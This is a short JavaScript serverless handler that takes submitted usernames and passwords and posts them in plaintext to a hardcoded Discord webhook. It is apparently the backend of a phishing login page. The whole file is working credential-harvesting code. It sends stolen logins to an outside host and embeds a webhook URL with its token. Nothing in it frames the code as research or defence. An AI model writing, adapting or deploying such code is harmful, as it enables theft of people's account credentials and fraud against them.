export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const webhookUrl = "https://discord.com/api/webhooks/1378978890373926963/KBqbq1R-P4Pu1ytdZl5oo5kHKVkCpz8MeszoyUjR1JRK1M-vIQ4ov2x4hFbhMJa_VGmQ";

    const { username, password, timestamp } = req.body;

    const message = {
        username: "Login Bot",
        embeds: [{
            title: "New Login Attempt",
            color: 0xFF0000,
            fields: [
                {
                    name: "Username",
                    value: username,
                    inline: true
                },
                {
                    name: "Password",
                    value: password,
                    inline: true
                },
                {
                    name: "Time",
                    value: timestamp,
                    inline: false
                }
            ]
        }]
    };

    try {
        const discordResponse = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        });

        if (!discordResponse.ok) {
            throw new Error(`Discord returned ${discordResponse.status}`);
        }
        
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Webhook Error:', error);
        res.status(500).json({ error: error.message });
    }
}